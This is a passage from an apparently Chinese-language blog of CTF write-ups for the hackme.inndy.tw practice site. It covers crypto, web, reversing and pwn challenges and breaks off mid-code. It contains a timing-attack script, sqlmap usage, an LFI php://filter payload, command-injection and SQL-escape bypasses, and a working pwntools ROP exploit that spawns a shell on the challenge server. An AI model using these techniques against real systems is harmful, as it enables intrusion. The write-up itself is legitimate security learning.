class="string">'w'</span>).write(flag)</span><br></pre></td></tr></table></figure><p>不过虽然看上去挺难, 但仔细点就会发现 c 的值就在密文开头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unrot13</span><span class="params">(s)</span>:</span></span><br><span class="line">     <span class="keyword">return</span> s.translate(str.maketrans(string.ascii_uppercase[<span class="number">13</span>:] + string.ascii_uppercase[:<span class="number">13</span>] +</span><br><span class="line">                                         string.ascii_lowercase[<span class="number">13</span>:] + string.ascii_lowercase[:<span class="number">13</span>],</span><br><span class="line">                                         string.ascii_uppercase + string.ascii_lowercase))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unupsidedown</span><span class="params">(s)</span>:</span></span><br><span class="line">     <span class="keyword">return</span> s.translate(str.maketrans(string.ascii_lowercase + string.ascii_uppercase,</span><br><span class="line">                                         string.ascii_uppercase + string.ascii_lowercase))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unbase64</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> b64decode(s).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unhex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> unhexlify(s).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag.enc'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">E = (unrot13, unbase64, unhex, unupsidedown)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    c, data = int(data[<span class="number">0</span>]), data[<span class="number">1</span>:]</span><br><span class="line">    data = E[c](data)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">'FLAG'</span>):</span><br><span class="line">        print(data)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="slow"><a class="headerlink" href="#slow"></a>slow</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7708</p><p>OMG, It's slow.</p></blockquote><p>这道题本来一直都没有头绪, 后来打完 TJCTF 后再看, 才反应过来是时序攻击.<br>因为打 TJCTF 的时候也遇到了一道类似的, 体验十分艹蛋..., 道理我都懂, 可我网络不好啊(摔).<br>当时找到了一个轮子 <a href="https://github.com/SakiiR/timeauth" target="_blank" rel="noopener">timeauth</a>, 颜值挺高, 不过没有多线程太弱了orz</p><p>尤其是对于这道题, 验证一次要数秒, 每多一位验证时间也 <s>+1s</s>, 没有多线程那得跑多久......<br>于是毫不犹豫 fork 了一份拿来魔改: <a href="https://github.com/Aloxaf/timeauth" target="_blank" rel="noopener">timeauth</a></p><p>charset 37位, 开个19线程. 跑了二十多分钟就出 flag 了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase, digits</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">from</span> timeauth <span class="keyword">import</span> TimeAuthChecker</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExampleChecker</span><span class="params">(TimeAuthChecker)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(self.__class__, self).__init__(</span><br><span class="line">            charset=ascii_uppercase + digits + <span class="string">'_'</span>,</span><br><span class="line">            token_length=<span class="number">30</span>, <span class="comment"># 随便猜的长度</span></span><br><span class="line">            max_thread=<span class="number">19</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, token)</span>:</span></span><br><span class="line">        context.log_level = <span class="string">'error'</span></span><br><span class="line">        s = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7708</span>)</span><br><span class="line">        base_time = time()</span><br><span class="line">        s.sendlineafter(<span class="string">'What is your flag?'</span>, <span class="string">'FLAG&#123;'</span> + token + <span class="string">'&#125;'</span>)</span><br><span class="line">        s.readall()</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> time() - base_time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    a = ExampleChecker()</span><br><span class="line">    a.process()</span><br><span class="line">    a.print_token()</span><br></pre></td></tr></table></figure><p><s>(考虑到本咸鱼不知道向后兼容为何物, 这份代码说不定现在已经跑不了了)</s></p><h2 id="pusheen-txt"><a class="headerlink" href="#pusheen-txt"></a>pusheen.txt</h2><blockquote><p>Do you think pusheen is cute?</p></blockquote><p>下载解压得到 pusheen.txt, 里面是一堆不可名状的字符画</p><p>总共就两种, 把这个序列转成二进制, 再转ASCII, 就得到了 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -oP <span class="string">"(▄▀▀▒██▒██▒)|(▄▀▀ ██ ██ )"</span> pusheen.txt|xargs <span class="built_in">echo</span> -n|sed <span class="string">'s/▄▀▀▒██▒██▒/1/g;s/▄▀▀ ██ ██/0/g;s/ //g'</span>|rax2 -bt</span><br></pre></td></tr></table></figure><h2 id="big"><a class="headerlink" href="#big"></a>big</h2><blockquote><p>It's a big file, read the flag.</p></blockquote><p>下载一个 big.xxz, 解压一次得到 big.xz. 里面是个 16G 的 <code>big</code> 文件</p><p>xzcat 看一下前面, 发现都是 <code>THISisNOTFLAG{}</code>, 估计在最末尾......</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lzma</span><br><span class="line"></span><br><span class="line">f = lzma.open(<span class="string">'./big.xz'</span>)</span><br><span class="line">f.seek(<span class="number">-100</span>, <span class="number">2</span>) <span class="comment">#巨慢的 seek()...</span></span><br><span class="line">print(f.read())</span><br></pre></td></tr></table></figure><p>(听 M4x 师傅说这道题 Inndy 师傅本意是让我们直接修改 xz 文件去掉开头的一堆重复...)</p><p><s>后来我试着研究了一下, 放弃了</s></p><h1 id="web"><a class="headerlink" href="#web"></a>Web</h1><h2 id="hide-and-seek"><a class="headerlink" href="#hide-and-seek"></a>hide and seek</h2><blockquote><p>Can you see me? I'm so close to you but you can't see me.</p></blockquote><p>在首页</p><h2 id="guestbook"><a class="headerlink" href="#guestbook"></a>guestbook</h2><blockquote><p>This guestbook sucks. sqlmap is your friend.</p></blockquote><p>打开网站, 有三个选项, Home, Message List, 和 New Post. 点击 New Post<br>随便发个帖, 然后回到 Message List, 点击即可进入开始发的帖子.</p><p>获得帖子的 url 如下: <code>https://hackme.inndy.tw/gb/?mod=read&amp;id=9</code></p><p>试着访问 id=8, 访问不了. 直接 <code>sqlmap -u 'https://hackme.inndy.tw/gb/?mod=read&amp;id=9'</code> 失败, 显示被重定向. 看了需要传递更多的信息给 sqlmap (cookie, user-agent 啥的)</p><p>首先利用 BurpSuite 抓包, 然后对截获的数据包执行 Action: Copy to file.<br>假设保存为了 <code>request.txt</code>. 然后执行 <code>sqlmap -q request.txt -p id</code>,<br>成功判断出注入类型为基于时间的盲注, 然后按套路找 flag 就行.</p><h2 id="lfi"><a class="headerlink" href="#lfi"></a>LFI</h2><blockquote><p>What this admin's password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p></blockquote><p>本地文件包含漏洞. 使用<br><code>php://filter/read=convert.base64-encode/resource=pages/login</code> 读取 login.php 的源码, 得到了管理员用户名和密码的 MD5, 根据 MD5 查到 password, 登录得到flag</p><h2 id="homepage"><a class="headerlink" href="#homepage"></a>homepage</h2><blockquote><p>Where is the flag? Did you check the code?</p></blockquote><p>根据提示去找code, 能发现一个 aaencode 过的js, 解密以后得到如下代码</p><p>(值得一提的是 chrome 似乎自带了反混淆功能? 执行混淆后的代码, 在输出中点击 VM374:3 这种, 就会得到非常清晰的代码)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_qrcode</span>(<span class="params">o, c, n, e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> r = [],</span><br><span class="line">    l = [];</span><br><span class="line">  c = c || <span class="string">"22px"</span>, n = n || <span class="string">"black"</span>, e = e || <span class="string">"white"</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; o.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> p = o[i], t = <span class="number">0</span>; t &lt; p.length; t++) l.push(<span class="string">"%c\u25a0"</span>), r.push(<span class="string">"line-height:0; font-size: "</span> + c + <span class="string">"; color:"</span> + (<span class="string">"1"</span> == p[t] ? n : e));</span><br><span class="line">    l.push(<span class="string">"\n"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  r.unshift(l.join(<span class="string">""</span>)), <span class="built_in">console</span>.log.apply(<span class="built_in">console</span>, r)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> qrcode = [<span class="string">"11111110001000110011101111111"</span>, <span class="string">"10000010111000110100101000001"</span>, <span class="string">"10111010100000100100001011101"</span>, <span class="string">"10111010010010010001001011101"</span>, <span class="string">"10111010111010111010101011101"</span>, <span class="string">"10000010101010011001001000001"</span>, <span class="string">"11111110101010101010101111111"</span>, <span class="string">"000000001011000101101"</span>, <span class="string">"1101001100011110101000111011"</span>, <span class="string">"1111000111011010110011110001"</span>, <span class="string">"1101111000011100101100011001"</span>, <span class="string">"110111011111110110110101001"</span>, <span class="string">"01011011001100101111111101001"</span>, <span class="string">"00100101010101000101110000111"</span>, <span class="string">"00011011000101100110011001111"</span>, <span class="string">"1010110101010001111101101001"</span>, <span class="string">"00001011110011000111110001111"</span>, <span class="string">"0101100100001110100011110001"</span>, <span class="string">"10010111100110100010110111011"</span>, <span class="string">"0010110110101011011010011101"</span>, <span class="string">"10010110010000001010111110111"</span>, <span class="string">"0000000011110010110110001111"</span>, <span class="string">"1111111010100000101010101111"</span>, <span class="string">"10000010000000111000100011101"</span>, <span class="string">"10111010001010001000111110011"</span>, <span class="string">"1011101010111000001010100111"</span>, <span class="string">"10111010001010000111110010001"</span>, <span class="string">"1000001011101111111110010101"</span>, <span class="string">"1111111011010110010011001101"</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"%cI love CTF!"</span>, <span class="string">"color: pink; font-size: 64px"</span>), print_qrcode(qrcode, <span class="string">"25px"</span>, <span class="string">"#333"</span>, <span class="string">"#ccc"</span>);</span><br></pre></td></tr></table></figure><p>可以看到里面有 qrcode 字样, 将这串01数组转成图片就能得到二维码(有个比较短的需要自己补齐),<br>扫描得到flag</p><h2 id="ping"><a class="headerlink" href="#ping"></a>ping</h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p>题目给了源码, 目的是对这个命令注入 <code>ping -c 1 &quot;{$ip}&quot; 2&gt;&amp;1</code></p><p>过滤了 &amp;, |, ; 等字符, 但可以用 $(ls) 这种来替换掉原来的ip, 可以在报错中得到部分信息.</p><p>虽然过滤了 cat, 但 linux 下能读取文件的命令还很多, 至于字符串 flag 被过滤就用通配符来代替即可</p><h2 id="scoreboard"><a class="headerlink" href="#scoreboard"></a>scoreboard</h2><blockquote><p>DO NOT ATTACK or SCAN scoreboard, you don't need to do that.</p></blockquote><p>嗯....藏在post的HEADER里</p><h2 id="login-as-admin-0"><a class="headerlink" href="#login-as-admin-0"></a>login as admin 0</h2><blockquote><p>SQL Injection!</p></blockquote><p>可以看到源码, SQL语句模板如下<br><code>&quot;SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'&quot;</code>.<br>并且网页会在源码中返回 debug 信息, 包含了完整的 SQL 语句.</p><p>代码主要过滤了 <code>'</code> , 将其替换为了 <code>\'</code> , 可以用 <code>\'</code> 绕过. (替换后变成了 <code>\\'</code>, 我们添加的转义符转义了它添加的转义符233 )</p><h2 id="login-as-admin-3"><a class="headerlink" href="#login-as-admin-3"></a>login as admin 3</h2><p>又是神奇的比较,  <code>&quot;asd&quot; == 0</code> , 妙啊妙啊. 使 <code>sig=0</code> 就能保证验证通过(对于这道题)</p><h2 id="login-as-admin-4"><a class="headerlink" href="#login-as-admin-4"></a>login as admin 4</h2><p>本意应该是检测到密码不对就跳转到 fail 页面, 然而添加完 header 以后并没有及时退出, 只要找个命令行工具就可以忽略掉跳转看到后面的 flag 了</p><h2 id="login-as-admin-6"><a class="headerlink" href="#login-as-admin-6"></a>login as admin 6</h2><p><code>extract</code>函数可以从一个数组中导入变量到当前的符号表中, 那直接简单粗暴地发送 <code>{&quot;user&quot;: &quot;admin&quot;}</code> 就好了...</p><h2 id="login-as-admin-7"><a class="headerlink" href="#login-as-admin-7"></a>login as admin 7</h2><p>验证密码的方式是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($_POST[<span class="string">'password'</span>]) == <span class="string">'00000000000000000000000000000000'</span></span><br></pre></td></tr></table></figure><p>php 的神奇类型转换, <code>'0e123456' == '0'</code>, 只要找一个以 0e 开头并且后面全是纯数字的 md5 就行了.</p><p>搜一下能搜到很多.</p><h2 id="dafuq-manager-1"><a class="headerlink" href="#dafuq-manager-1"></a>dafuq-manager 1</h2><blockquote><p>Login as guest and find flag 1</p></blockquote><p>篡改cookie的题, 进去后有提示</p><h1 id="reversing"><a class="headerlink" href="#reversing"></a>Reversing</h1><h2 id="helloworld"><a class="headerlink" href="#helloworld"></a>helloworld</h2><blockquote><p>Guess a number please :D</p></blockquote><p>猜数字, 没啥混淆, 直接IDA</p><h2 id="simple"><a class="headerlink" href="#simple"></a>simple</h2><blockquote><p>A little bit harder</p></blockquote><p>确实很simple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b'UIJT.JT.ZPVS.GMBH'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(chr(i - <span class="number">1</span>), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="pyyy"><a class="headerlink" href="#pyyy"></a>pyyy</h2><blockquote><p>Can you pass the challenage?</p></blockquote><p>uncompyle6 反编译一下就行. 传说中的Y-组合子, 可以实现匿名函数的递归.<br>举个例子, 下面代码中的 self 就代表那个匿名函数自身.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> _, arg1, arg2: _(_, arg1, arg2))(</span><br><span class="line">    <span class="keyword">lambda</span> self, arg1, arg2: <span class="string">'I can call my self'</span>, arg1, arg2)</span><br></pre></td></tr></table></figure><p>不过不知道也无所谓, 反正得到 flag 只要 <code>int(c) == l</code> 成立. c 是用户输入, l 是程序计算得到的值, 而且与 c 无关.</p><p>那直接加个 print 输出 l 就行.</p><h2 id="accumulator"><a class="headerlink" href="#accumulator"></a>accumulator</h2><blockquote><p>Reverse this for the flag</p></blockquote><p>程序接受一个 flag, SHA512 后送入某函数(姑且称之为 check )检查.</p><p>分析check函数可得知验证方法就是把每一位累加, 然后与一个全局数组进行比对.</p><p>提取出全局数组, 然后两两作差即可得到flag</p><h2 id="gccc"><a class="headerlink" href="#gccc"></a>GCCC</h2><blockquote><p>Maybe you should try some z3 magic.</p></blockquote><p>一个 .Net 程序, 反编译以后可以发现只要求得一个 uint32 变量的值就能得到flag了.</p><p>验证过程并不耗时, 于是直接爆破, 秒出 flag . (不过我的爆破顺序是从2^32^ -&gt; 1)</p><h2 id="ccc"><a class="headerlink" href="#ccc"></a>ccc</h2><blockquote><p>ccc cc</p></blockquote><p>程序接受一个flag, 分别计算前 3, 6, 9, ... 位的crc32值然后与 hashes 数组中的值进行比较.</p><p>每次的爆破量只有三位, 直接爆破就行</p><h2 id="bitx"><a class="headerlink" href="#bitx"></a>bitx</h2><blockquote><p>bits?</p></blockquote><p>这道题可以不逆向直接一位一位爆破...不知道是故意的还是题目漏洞...</p><h2 id="2018-rev"><a class="headerlink" href="#2018-rev"></a>2018-rev</h2><blockquote><p>Happy New Year 2018! Can you execute this binary on the right time with the right argv?</p></blockquote><p>运行/反编译可以得知, 这个程序需要在 <code>argc == 2018 &amp;&amp; argv[0][0] == 1 &amp;&amp; envp[0][0] == 1</code> 和时间为<br><code>2018-01-01 00:00:00 (UTC)</code> 的情况下才会输出flag.</p><p>argc 直接 <code>./2018.rev {1..2017}</code> 就能满足, argv[0][0] 的话可以建立一个名为 <code>\x01</code> 的文件夹 (ls 看起来是这个样子<br><code>$'\001'</code>, nautilus 里看到是个空白...) 然后 <code>$'\001'/2018.rev {1..2017}</code></p><p>envp 那个试了一下不好解决, 主要是没办法让自己的变量刚好在第一位.<br>于是我就用IDA patch掉了这里 (当然后面引用了这个地方的也要一并patch掉)</p><p>时间这个一开始用 libfaketime, 一直通不过验证. 一怒之下直接也 patch 掉了这里, 然后发现这个时候其实已经可以看出flag了...</p><p>也可以直接改时间: <code>sudo date -su '2018-01-01 00:00:00';$'\001'/2018.rev {1..2017}</code>得到完整的flag.</p><p>(其实一开始想到了这个, 可是觉得改回来会很麻烦就一直没去做, 最后试了才发现这个时间系统秒改回...完全不用担心把时间弄乱</p><h2 id="what-the-hell"><a class="headerlink" href="#what-the-hell"></a>what-the-hell</h2><blockquote><p>Tips: modinv, Something is slow there in my code, make it faster.</p></blockquote><p>这道题真是把我坑到了.</p><p>首先IDA走起, 程序接受两个 uint 数字赋给两个 int 变量. 然后调用<br><code>calc_key3</code> 验证并计算下一步的key.</p><p>前面四个条件用 z3 + gmpy2 轻松算出了一组结果. 接下来就是what函数,<br>真的是相当慢.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a1, a2 = BitVecs(<span class="string">'a1, a2'</span>, <span class="number">32</span>)</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(a1 * a2 == <span class="number">-574406350</span>)</span><br><span class="line">solver.add((a1 ^ <span class="number">0x7E</span>) * (a2 + <span class="number">16</span>) == <span class="number">1931514558</span>)</span><br><span class="line">solver.add((SignExt(<span class="number">16</span>, a1) - SignExt(<span class="number">16</span>, a2)) &amp; <span class="number">0xFFF</span> == <span class="number">3295</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    x = m[a1].as_long()</span><br><span class="line">    y = m[a2].as_long()</span><br><span class="line">    <span class="keyword">if</span> is_prime(x):</span><br><span class="line">        print(x, y)</span><br><span class="line">    solver.add(Or(a1 != x, a2 != y))</span><br></pre></td></tr></table></figure><p>不难看出 what is fibonacci, 第一反应是使用 gmpy2.fib 进行计算. 算了半天发现不对劲, 才想起这个地方会溢出.</p><p>于是使用 numpy.int32 手动运算, 辅以 <code>lru_cache</code>, 然而 maxsize 太小速度过慢,<br>太大轻松爆内存, 再加上 Python 递归层数限制....最后选择用 C .</p><p>C语言的实现非常高效, 然而并没有跑出我需要的key.<br>反复检查以后无奈跑到了M4x大佬的博客, 看了大佬的wp才发现这个地方a1和a2有两组解....</p><p>修改程序跑出另一组解, 顺利拿到 key, 然后直接用IDA patch掉多余的部分, 直接令 key = xxxx.</p><p>运行, 输入 key1 key2, 成功得到 flag</p><h2 id="mov"><a class="headerlink" href="#mov"></a>mov</h2><blockquote><p>MOV instruction is turing complete!</p></blockquote><p>有了 bitx 那道题的经验, 这道题又直接逐位爆破搞了出来...<br>(<s>爆破真是太棒了</s>)</p><h1 id="pwn"><a class="headerlink" href="#pwn"></a>Pwn</h1><h2 id="catflag"><a class="headerlink" href="#catflag"></a>catflag</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7709<br>Try using nc connect to server!</p></blockquote><p>签到题, nc 上去 <code>cat flag</code></p><h2 id="homework"><a class="headerlink" href="#homework"></a>homework</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7701<br>Source Code, Index out bound, Return Address</p></blockquote><p>给了二进制和源码, 题目其实很简单, 数组下标越界导致了任意位置读写,<br>就算开了 canary 也没用.</p><p>直接把 ret 所在位置覆盖为 <code>call_memaybe</code> 函数地址就行了.</p><p>(然而太久没做 pwn 的我竟然把偏移算错了....)</p><h2 id="rop"><a class="headerlink" href="#rop"></a>ROP</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7704<br>Tips: Buffer Overflow, ROP<br>ROP輕鬆談 by L4ys</p></blockquote><p>首先 checksec 一下, 没有 canary. 一个采用静态链接的巨大程序.</p><p>到题目给出的链接看了一下, 应该是使用 ROPgadget. 试了一下,<br>一行代码就找出了 ROP chain, 妙啊. 然后计算好偏移把 ROP chain 写进去就行了.</p><h2 id="rop2"><a class="headerlink" href="#rop2"></a>ROP2</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7703</span><br></pre></td></tr></table></figure><p><code>ROPgadget</code>  not working anymore</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/tmp/tmp/rop2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开了栈不可执行. 不过可以调用 SYS_read, 往 some_buffer (.bss段的某个全局变量) 写入 /bin/sh, 然后调用 SYS_exexce get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.constants <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwnlib.gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context(log_level=<span class="string">'DEBUG'</span>, arch=<span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7703</span>)</span><br><span class="line"><span class="comment"># io = process('./rop2')</span></span><br><span class="line">ex = ELF(<span class="string">'./rop2'</span>)</span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(io)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">buf_addr = ex.symbols[<span class="string">'some_buffer'</span>]</span><br><span class="line">syscall_addr = ex.plt[<span class="string">'syscall'</span>]</span><br><span class="line">overflow_addr = ex.symbols[<span class="string">'overflow'</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'\x90'</span> * (<span class="number">0xC</span> + <span class="number">0x4</span>), syscall_addr, overflow_addr,</span><br><span class="line">                SYS_read, constants.STDIN_FILENO, buf_addr, <span class="number">7</span>])</span><br><span class="line">io.sendafter(<span class="string">':'</span>, payload)</span><br><span class="line">io.send(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'\x90'</span> * (<span class="number">0xC</span> + <span class="number">0x4</span>), syscall_addr, <span class="number">0xdeadbeef</span>,</span><br><span class="line">                SYS_execve, buf_addr, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">io.sendafter(<span class="string">':'</span>, payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h2 id="toooomuch"><a class="headerlink" href="#toooomuch"></a>toooomuch</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7702<br>Can you pass the game?</p></blockquote><p>送分题, 二分法慢慢猜就猜到了</p><h2 id="toooomuch-2"><a class="headerlink" href="#toooomuch-2"></a>toooomuch-2</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7702<br>Get a shell, please.<br>Tips: Buffer overflow, 0x8048560, shellcode</p></blockquote><p>和上一道题几乎一样的二进制文件, 不过把 <code>cat flag</code> 改成了 <code>cat fake_flag</code>.</p><p>先检查一下, 发现什么保护都没开, 然后有个全局变量 password 是可控的</p><p>往这里面写入 shellcode 然后跳转到这儿就能 getshell 了</p><h2 id="echo"><a class="headerlink" href="#echo"></a>echo</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7711<br>Tips: format string vulnerability</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec echo</span><br><span class="line">[*] &apos;/home/aloxaf/CTF/echo&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure><p>程序非常简单, 就是读入一个字符串然后用 printf 输出. 非常明显的格式化字符串漏洞.<br>并且有 system 函数可以利用.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; 